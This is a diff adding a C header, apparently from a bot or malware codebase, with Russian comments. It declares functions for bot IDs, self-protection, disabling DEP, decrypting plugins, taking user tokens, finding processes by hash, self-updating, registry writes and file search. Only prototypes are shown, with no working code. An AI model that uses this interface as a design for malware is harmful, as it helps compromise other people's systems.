@@ -1,0 +1,215 @@
+
+#ifndef UtilsH
+#define UtilsH
+//----------------------------------------------------------------------------
+
+#include <windows.h>
+
+#define WIN_2000	1
+#define WIN_XP		2
+#define WIN_2003	3
+#define WIN_VISTA	4
+#define WIN_7		5
+
+
+
+DWORD CalcHash( char *Str );
+DWORD CalcHashW( PWSTR str );
+DWORD Crypt( char* lpPassword, LPBYTE lpResult, DWORD dwSize );
+DWORD GetProcessIdByHash( DWORD dwHash );
+char *GetProcessList();
+
+HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param );
+HANDLE OpenProcessEx( DWORD dwHash );
+void GetUserToken();
+
+bool RunFile( WCHAR *Path );
+bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );
+bool MakeUpdate( WCHAR *FileName );
+
+bool SaveToFileW( LPCWSTR lpName, LPVOID lpBuffer, DWORD dwSize );
+
+char * FileToMD5(char *URL);
+
+void GenerateUid( char *BotUid );
+
+char *GetOSInfo();
+LPVOID GetInfoTable( DWORD dwTableType );
+void GetOSVersion();
+
+HANDLE CreateUpdateMutex();
+DWORD GetCurrentSessionId();
+
+DWORD WINAPI LoadDll( LPVOID lpData );
+DWORD GetFileHash( WCHAR *File );
+bool GodmodeOnFile( WCHAR *Filename );
+
+
+void DisableDEP();
+DWORD GetProcessHash();
+
+void ProtectBot();
+void UnProtectBot();
+
+LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
+LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );
+
+// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)
+DWORD GetExplorerPid();
+
+#define min(a,b)            (((a) < (b)) ? (a) : (b))
+
+//******************************************************************
+//  GenerateBotID - Функция генерирует идентификатор бота
+//
+//  Результат - Строка созданная функцией StrNew. Уничтожить
+//              функцией StrFree
+//******************************************************************
+PCHAR GenerateBotID();
+
+//******************************************************************
+//   DecryptBuffer - Функция декодирует буфер содержащий в себе
+//                   пароль
+//
+//  Buffer - Буфер зашифрованных данных
+//
+//   Size - Размер буфера. После работы функции будет содержать
+//			размер расшифрованных данных
+//
+//  Результат - Функция возвращает указатель на первый символ
+//              декодированного буфера.
+//  Память под результат НЕ выделяется!
+//******************************************************************
+LPBYTE DecryptBuffer(bool CheckSignature, LPBYTE Buffer, DWORD &Size);
+
+
+//******************************************************************
+//  DirExists - Функция возвращает истину если путь  Path ceotcndetn
+//******************************************************************
+bool DirExists(PCHAR Path);
+
+
+//******************************************************************
+//  FileExists* - Функция возвращает истину если файл  FileName
+//  			  существует
+//******************************************************************
+bool FileExistsA(PCHAR FileName);
+bool FileExistsW(PWCHAR FileName);
+
+//----------------------------------------------------------------------------
+// Функции поиска файлов и директорий
+//----------------------------------------------------------------------------
+
+typedef  LPWIN32_FIND_DATA PFindData;
+
+typedef void (* TFilesCallBack)(PFindData Search, // Структура поиска
+								PCHAR FileName,   // Имя найденного файла
+								LPVOID Data,      // Данные переданные в функцию поиска
+								bool &Cancel      // Указание прервать дальнейший поиск
+								);
+
+#define FA_ANY_FILES ( FILE_ATTRIBUTE_READONLY |\
+					   FILE_ATTRIBUTE_HIDDEN   |\
+					   FILE_ATTRIBUTE_SYSTEM   |\
+					   FILE_ATTRIBUTE_ARCHIVE)
+
+#define FA_DIRECTORY FILE_ATTRIBUTE_DIRECTORY
+
+//******************************************************************
+//  SearchFiles  - Функция перебирает все  поддиректории
+//
+//  Path - Пусть с которого начинается поиск. Должен заканчиваться
+//         обратным слешем \\
+//  Mask - Маска поиска. *.* для всех файлов
+//
+//  Recursive - Производить рекурсивный поиск
+//
+//  FileAttributes - Атрибуты искомых файлов
+//
+//  Data - Данные которые будут переданы в метод обратной связи
+//
+//  CallBack - метод обратной связи
+//
+//  Результат - Функция возвращает истину если поиск не был прерван
+//              из метода обратной связи
+//
+//******************************************************************
+bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
+				 LPVOID Data, TFilesCallBack CallBack);
+
+
+//******************************************************************
+//  GetUniquePID - Функция возвращает реальный идентификатор
+//	   текущего процесса. Отличие от GetProcessID() в том, что
+//     возвращает корректное значение для дочерних процессов
+//******************************************************************
+DWORD GetUniquePID();
+
+
+//******************************************************************
+//  IsNewProcess - Функция проверяет идентификатор текущего
+//		процесса со значением ProcessID и возвращает истину если
+//		они отличаются. В случае отличия значение ProcessID
+//      переприсвается
+//******************************************************************
+bool IsNewProcess(DWORD &ProcessID);
+
+
+//----------------------------------------------------------------------------
+// Registry - методы для работы с реестром Windows
+//----------------------------------------------------------------------------
+
+namespace Registry
+{
+	// создать раздел в реестре пример CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
+	bool CreateKey(HKEY h, char* path, char* name );
+	//корневой ключ, путь без ключа, имя создаваемого значения, значение(заменяет значение REG_SZ)
+	bool SetValueString(HKEY h, char* path, char* name,  char* values );
+	//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение DWORD)
+	bool SetValueDWORD(HKEY h, char* path, char* name,  DWORD values );
+	//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение REG_SZ)
+	bool CreateValueString(HKEY h, char* path, char* name,  char* values );
+}
+
+
+// функция добавлена при добавлении оперы
+char *CalcFileMD5Hash(char *szFileName);
+
+char *GetWndText( HWND hWnd );
+char *GetNetInfo();
+DWORD GetFileFormat( WCHAR *lpFileName );
+void MakeShutdown();
+
+
+
+//****************************************************************************
+//  Набор макросов вывода отладочных строк.
+//
+//  Макросы вызывают функции из модуля BotDebug
+//  Выведены с целью облегчить код и не заграмождать его директивами
+//  условной компиляции
+//****************************************************************************
+
+template <class MODULE, class LINE, class SECTION, class DATA, class STR>
+inline void DBGOutMessageEX(MODULE Module, LINE Line, SECTION Section, DATA Data, STR Str)
+{
+	#ifdef DebugUtils
+		Debug::MessageEx((PCHAR)Module, Line, (PCHAR)Section, (PCHAR)Data, (PCHAR)Str);
+	#endif
+}
+
+//template <class A>
+//inline void DBGOutMessageEX(PCHAR Module, DWORD Line, PCHAR Section, PCHAR Data, PCHAR Str, A a)
+//{
+//	#ifdef DebugUtils
+//		Debug::MessageEx(Module, Line, Section, Data, Str, a);
+//	#endif
+//}
+
+
+#define DBGMessageEx DBGOutMessageEX<>
+
+
+
+//----------------------------------------------------------------------------
+#endif
